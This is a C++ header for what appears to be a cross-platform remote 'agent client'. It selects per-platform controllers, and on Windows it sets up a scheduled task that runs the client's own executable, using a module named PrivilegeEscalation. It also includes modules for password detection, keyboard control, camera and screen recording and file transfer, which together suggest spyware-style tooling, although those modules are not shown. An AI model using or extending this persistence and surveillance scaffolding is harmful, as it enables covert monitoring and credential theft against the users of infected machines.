#pragma once

#if defined(_WIN32)
    #include "AppControl_WIN.h"
    #include "ProcessControl_WIN.h"
    #include "PrivilegeEscalation.h"
    using AppController = WinAppController;
    using ProcessController = WinProcessController;

    inline bool autoSetupTask() {
        if (PrivilegeEscalation::isAdmin()) {
            return true;
        }
        
        const std::string TASK_NAME = "AgentClient_AutoRun";
        
        if (PrivilegeEscalation::taskExists(TASK_NAME)) {
            return true;
        }
        
        std::cout << "[Platform] Dang tu dong setup Scheduled Task...\n";
        
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        
        if (PrivilegeEscalation::setupPersistentTask(exePath, TASK_NAME)) {
            std::cout << "[Platform] Da tao Scheduled Task thanh cong!\n";
            return true;
        } else {
            std::cout << "[Platform] Khong the tao Scheduled Task.\n";
            return false;
        }
    }

#elif defined(__APPLE__)
    #include "AppControl_MAC.h"
    #include "ProcessControl_MAC.h"
    using AppController = MacAppController;
    using ProcessController = MacProcessController;

#elif defined(__linux__)
    #include "AppControl_LINUX.h"
    #include "ProcessControl_LINUX.h"
    using AppController = LinuxAppController;
    using ProcessController = LinuxProcessController;
#endif

#include "CaptureScreen.h"
#include "CameraRecorder.h"
#include "KeyboardController.h"
#include "FileList.h"
#include "FileTransfer.h"
#include "CameraCapture.h"
#include "ScreenRecorder.h"
#include "CaptureScreen.h"
#include "PrivilegeEscalation.h"
#include "PasswordDetector.h"
#include "SystemInfoController.hpp"